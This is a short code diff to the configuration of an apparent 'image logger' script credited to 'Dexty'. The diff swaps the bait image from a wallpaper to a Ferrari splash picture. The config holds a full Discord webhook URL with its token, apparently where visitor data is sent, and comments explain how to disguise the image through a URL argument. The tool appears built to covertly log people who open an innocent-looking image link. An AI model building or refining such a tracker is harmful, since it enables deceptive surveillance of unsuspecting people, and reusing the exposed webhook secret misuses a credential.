@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1413912415350816870/qO6K1u6OBLw9pz0HW1lDPnu2jqWPDnRQbV6p01upzVXO-KA5LLRjyoxkbe5StTbdPfup",
-    "image": "https://wallpapers-clan.com/wp-content/uploads/2023/05/cool-pfp-02.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://carconfigurator.ferrari.com/rt-assets/data/cars/296gtb/ui/splashpage.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
